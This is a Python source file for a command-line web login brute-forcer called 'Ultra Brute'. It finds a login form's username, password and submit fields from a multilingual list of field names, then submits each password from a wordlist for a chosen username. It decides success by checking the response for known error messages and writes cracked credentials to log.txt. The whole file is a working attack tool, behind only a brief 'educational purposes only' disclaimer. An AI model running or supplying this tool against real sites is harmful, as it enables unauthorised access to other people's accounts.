import requests
from bs4 import BeautifulSoup
import time
from colorama import init, Fore, Style
import re

# Initialize colorama
init()

# Function to load error messages from a file
def load_error_messages(file_path):
    with open(file_path, "r") as f:
        error_messages = [line.strip() for line in f.readlines() if line.strip()]
    return error_messages

# Function to check if any of the error messages are in the response
def check_login_failure(response_text, error_messages):
    for message in error_messages:
        if message in response_text:
            return True
    return False

# Function to find form elements dynamically and check if login elements are present
def find_form_elements_and_check_login(soup):
    form_elements = {}
    possible_usernames = {
        'username': [
            'username', 'user', 'email', 'login', 'usr', 'uname', 'userid', 'user_id',
            'user_name', 'utilisateur', 'usuario', 'benutzername', 'nome_utente',
            'имя_пользователя', 'ユーザー名', '사용자 이름', '用户名', 'user_login',
            'username_field', 'email_field', 'login_field', 'utilisateur_field',
            'usuario_field', 'benutzername_field', 'nome_utente_field', 'имя_пользователя_field',
            'ユーザー名_field', '사용자 이름_field', '用户名_field', 'Acceder_field', 'user_login_field',
            'user-id', 'user_id_field', 'id_usuario', 'id_utilisateur', 'id_utente',
            'id_usuario_field', 'id_utilisateur_field', 'id_utente_field', 'user_name_field',
            'id_usuario_form', 'id_utilisateur_form', 'id_utente_form', 'id_usuario_page',
            'id_utilisateur_page', 'id_utente_page', 'access', 'acesso', 'zugang', 'accesso',
            'dostęp', 'доступ', '액세스', '访问', 'acceso_usuario', 'utilisateur_access',
            'username_input', 'email_input', 'login_input', 'user_field', 'username_form',
            'email_form', 'login_form', 'user_form'
        ],
        'password': [
            'password', 'pass', 'pwd', 'contraseña', 'senha', 'motdepasse', 'пароль',
            'パスワード', '암호', '密码', 'clave', 'Contraseña', 'password_field', 'pass_field',
            'pwd_field', 'contraseña_field', 'senha_field', 'motdepasse_field', 'пароль_field',
            'パスワード_field', '암호_field', '密码_field', 'clave_field', 'contraseña_text',
            'senha_text', 'motdepasse_text', 'пароль_text', 'パスワード_text', '암호_text',
            '密码_text', 'clave_text', 'Contraseña_text', 'password-input', 'pass-input',
            'pwd-input', 'password_form', 'pass_form', 'pwd_form', 'contraseña_form', 'senha_form',
            'motdepasse_form', 'пароль_form', 'パスワード_form', '암호_form', '密码_form', 'clave_form',
            'password_entry', 'passwordbox', 'pass_box', 'password_text', 'passwordinput', 'pass_input'
        ],
        'login_button': [
            'submit', 'login', 'signin', 'log_in', 'connect', 'entrar', 'acceder',
            'iniciar_sesión', 'connexion', 'anmelden', 'se_connecter', 'вход', 'войти',
            '로그인', '登录', 'connexion', 'ingressar', 'wp-submit', 'submit_button',
            'login_button', 'signin_button', 'log_in_button', 'connect_button', 'entrar_button',
            'acceder_button', 'iniciar_sesión_button', 'connexion_button', 'anmelden_button',
            'se_connecter_button', 'вход_button', 'войти_button', '로그 인_button', '登录_button',
            'connexion_button', 'ingressar_button', 'wp-submit_button', 'submit_form', 'login_form',
            'signin_form', 'log_in_form', 'connect_form', 'entrar_form', 'acceder_form',
            'iniciar_sesión_form', 'connexion_form', 'anmelden_form', 'se_connecter_form',
            'вход_form', 'войти_form', '로그인_form', '登录_form', 'connexion_form', 'ingressar_form',
            'wp-submit_form', 'submit_button_form', 'login_button_form', 'signin_button_form',
            'log_in_button_form', 'connect_button_form', 'entrar_button_form', 'acceder_button_form',
            'iniciar_sesión_button_form', 'connexion_button_form', 'anmelden_button_form',
            'se_connecter_button_form', 'вход_button_form', 'войти_button_form', '로그인_button_form',
            '登录_button_form', 'connexion_button_form', 'ingressar_button_form', 'wp-submit_button_form',
            'Acceder'
        ]
    }

    input_fields = soup.find_all('input')
    button_fields = soup.find_all('button')

    for input_field in input_fields:
        for key, names in possible_usernames.items():
            if any(re.search(rf'\b{name}\b', str(input_field), re.IGNORECASE) for name in names):
                form_elements[key] = input_field.get('name') or input_field.get('id')

    for button_field in button_fields:
        for name in possible_usernames['login_button']:
            if re.search(rf'\b{name}\b', str(button_field), re.IGNORECASE):
                form_elements['login_button'] = button_field.get('name') or button_field.get('id')

    # Check if all required form elements are found
    if all(field in form_elements for field in ['username', 'password', 'login_button']):
        return form_elements, True
    else:
        return form_elements, False

# Function to print developer logo and disclaimer
def print_developer_logo():
    logo = """
 _   _ _ _               ____             _
| | | | | |_ _ __ __ _  | __ ) _ __ _   _| |_ ___
| | | | | __| '__/ _` | |  _ \| '__| | | | __/ _ \\
| |_| | | |_| | | (_| | | |_) | |  | |_| | ||  __/
 \___/|_|\__|_|  \__,_| |____/|_|   \__,_|\__\___|
    """
    disclaimer = """
    _______________________________________________

    This script is intended for educational purposes only.
    The developer assumes no responsibility for any misuse or damage caused.
    Use it responsibly and with proper authorization.
    ______________________________________________
    """
    print(Fore.GREEN + logo + Style.RESET_ALL)
    print("_______________________\n")
    print("Telegram: @Algerianultra")
    print("Facebook: https://facebook.com/Algerian.ultra")
    print("Github: https://github.com/Algerianultra")
    print("_______________________")
    print(disclaimer)

# Function to run password guessing with delay
def run_password_guessing(target_url, username, password_list_path, error_messages_file):
    try:
        # Validate the target URL
        if not target_url.startswith('http://') and not target_url.startswith('https://'):
            raise ValueError("Invalid URL format. Please provide a valid URL starting with 'http://' or 'https://'.")

        # Load error messages from file
        error_messages = load_error_messages(error_messages_file)

        # Make initial GET request to fetch the page and analyze its structure
        response = requests.get(target_url)

        # Check if response status code is OK
        if response.status_code != 200:
            raise Exception(f"Failed to fetch the page. Status Code: {response.status_code}")

        soup = BeautifulSoup(response.content, 'html.parser')

        # Find form elements dynamically and check if login elements are present
        form_elements, login_elements_present = find_form_elements_and_check_login(soup)

        if not login_elements_present:
            print(Fore.RED + "[+] This URL does not appear to be a login page. Unable to locate necessary form elements." + Style.RESET_ALL)
            return

        # Print developer logo and disclaimer
        print_developer_logo()
        print(Fore.YELLOW + f"[+] Attack starting with URL: {target_url}" + Style.RESET_ALL)
        print("_______________________")

        # Prepare the data dictionary with initial values
        data_dictionary = {
            form_elements['username']: username,
            form_elements['password']: '',
            form_elements['login_button']: 'submit'
        }

        # Open the password list file
        with open(password_list_path, "r") as wordlist_file:
            print(Fore.YELLOW + "[+] Starting password Brute" + Style.RESET_ALL)

            # Iterate through each password in the file
            for line in wordlist_file:
                password = line.strip()
                data_dictionary[form_elements['password']] = password

                # Make the POST request
                response = requests.post(target_url, data=data_dictionary)

                # Check if login was successful
                if not check_login_failure(response.content.decode(), error_messages):
                    print(Fore.GREEN + f"[+] Correct password found: {password}" + Style.RESET_ALL)
                    print("_______________________")
                    print(Fore.GREEN + f"Attack finish\nResult: username: {username}\n         password: {password}" + Style.RESET_ALL)
                    print("_______________________")

                    # Save result to log file
                    with open('log.txt', 'a') as log_file:
                        log_file.write(f"Target URL: {target_url}\nUsername: {username}\nPassword: {password}\n\n")

                    return
                else:
                    print(Fore.RED + f"[+] Incorrect password: {password}" + Style.RESET_ALL)
                    time.sleep(1)  # Add a delay between attempts for politeness

            # If all passwords failed
            print(Fore.RED + "[+] All passwords failed. The correct password was not found." + Style.RESET_ALL)
            print("_______________________")

    except ValueError as ve:
        print(Fore.RED + str(ve) + Style.RESET_ALL)
    except requests.exceptions.RequestException as re:
        print(Fore.RED + f"Failed to connect to the target URL: {str(re)}" + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + str(e) + Style.RESET_ALL)

# Function to print developer logo and disclaimer initially
print_developer_logo()

# Input URLs and credentials
target_url = input(Fore.YELLOW + "[+] Input URL: " + Style.RESET_ALL).strip()
username = input(Fore.YELLOW + "[+] Input username: " + Style.RESET_ALL).strip()
password_list_path = input(Fore.YELLOW + "[+] Input password list: " + Style.RESET_ALL).strip()
error_messages_file = "error_messages.txt"  # Path to the error messages file

# Run password guessing
run_password_guessing(target_url, username, password_list_path, error_messages_file)
